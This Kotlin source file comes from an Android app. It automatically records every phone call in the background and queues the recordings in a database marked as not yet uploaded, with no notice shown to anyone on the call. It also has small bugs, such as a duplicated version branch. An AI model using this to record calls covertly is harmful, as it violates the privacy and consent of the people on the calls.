package com.github.yohannestz.popov.services

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.os.Build
import android.os.Environment
import android.telephony.PhoneStateListener
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.core.content.ContextCompat.getMainExecutor
import com.aykuttasil.callrecord.CallRecord
import com.github.yohannestz.popov.data.local.db.RecordRepositoryImpl
import com.github.yohannestz.popov.data.model.Record
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.util.*
import javax.inject.Inject

@AndroidEntryPoint
class PhoneCallStateReceiver : BroadcastReceiver() {

    private lateinit var gContext: Context
    private lateinit var mediaRecorder: MediaRecorder

    @Inject
    lateinit var recordingRepositoryImpl: RecordRepositoryImpl

    override fun onReceive(context: Context, intent: Intent) {
        mediaRecorder = buildMediaRecorder(context)
        isMediaPrepared = true

        val telephonyManager =
            context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        gContext = context
        if (intent.action == "android.intent.action.PHONE_STATE"
            || intent.action == "android.intent.action.NEW_OUTGOING_CALL"
        ) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                telephonyManager.registerTelephonyCallback(
                    getMainExecutor(context),
                    CustomTelephonyCallback()
                )
            } else {
                telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.S)
    inner class CustomTelephonyCallback : TelephonyCallback(),
        TelephonyCallback.CallStateListener {
        override fun onCallStateChanged(state: Int) {
            baseOnCallStateChanged(state)
        }
    }


    private val phoneStateListener = object : PhoneStateListener() {
        @Deprecated("Deprecated in Java")
        override fun onCallStateChanged(state: Int, phoneNumber: String?) {
            super.onCallStateChanged(state, phoneNumber)
            baseOnCallStateChanged(state)
        }
    }

    private fun baseOnCallStateChanged(state: Int) {
        when (state) {
            TelephonyManager.CALL_STATE_IDLE -> {
                Log.e("PhoneCallStateReceiver", "CALL_STATE_IDLE : Detected in background")
                if (isMediaPrepared && isMediaRecording) {
                    mediaRecorder.stop()
                    mediaRecorder.reset()
                    mediaRecorder.release()
                    isMediaPrepared = false
                    isMediaRecording = false
                    CoroutineScope(Dispatchers.IO).launch {
                        recordingRepositoryImpl.insertRecording(Record(timeStamp = Calendar.getInstance().time.toString(), fileName = fileUrl, isUploaded = false))
                        fileUrl = ""
                    }
                }
            }

            TelephonyManager.CALL_STATE_RINGING -> {
                Log.e("PhoneCallStateReceiver", "CALL_STATE_RINGING : Detected in background")
            }
            TelephonyManager.CALL_STATE_OFFHOOK -> {
                Log.e("PhoneCallStateReceiver", "CALL_STATE_OFF-HOOK : Detected in background")
                //callRecord.startCallReceiver()
                mediaRecorder.prepare()
                mediaRecorder.start()
                isMediaRecording = true
            }
        }
    }

    private fun buildMediaRecorder(context: Context): MediaRecorder {
        val mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            MediaRecorder()
        }

        val filePath =
            File("${Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)}${File.separator}" + "CallRec/call_rec.3gp")
        if (!filePath.exists()) {
            filePath.mkdirs()
        }
        Log.e("fileExists", filePath.exists().toString())

        val currentTime: Date = Calendar.getInstance().time

        val file = File(context.filesDir, "call_rec${currentTime.time}.3gp")
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION)
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            mediaRecorder.setOutputFile(file)
            fileUrl = file.absolutePath
            Log.e("mediaRecLoc", file.toString())
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            mediaRecorder.setOutputFile(filePath)
            Log.e("mediaRecLoc", filePath.toString())
            fileUrl = filePath.absolutePath
        } else {
            mediaRecorder.setOutputFile(filePath.toString())
            Log.e("mediaRecLoc", filePath.toString())
            fileUrl = filePath.absolutePath
        }
        return mediaRecorder
    }

    companion object {
        private var isMediaPrepared = false
        private var isMediaRecording = false
        private var fileUrl = ""
    }

}